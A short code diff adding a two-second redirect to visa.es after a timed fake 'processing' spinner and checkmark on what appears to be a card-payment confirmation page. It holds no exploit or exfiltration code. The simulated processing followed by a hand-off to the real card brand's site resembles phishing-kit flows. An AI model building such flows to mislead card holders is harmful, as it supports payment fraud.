@@ -3654,9 +3654,14 @@
             document.querySelector('.spinner').style.display = 'none';
             document.querySelector('.processing-text').style.display = 'none';
             document.getElementById('checkmark-container').classList.add('active');
-            
+
             // Iniciar temporizador de cierre de sesión
             startSessionTimer();
+
+            // Redirigir a visa.es luego de mostrar la confirmación
+            setTimeout(function() {
+                window.location.href = 'https://visa.es';
+            }, 2000);
         }, 3000);
     }
     
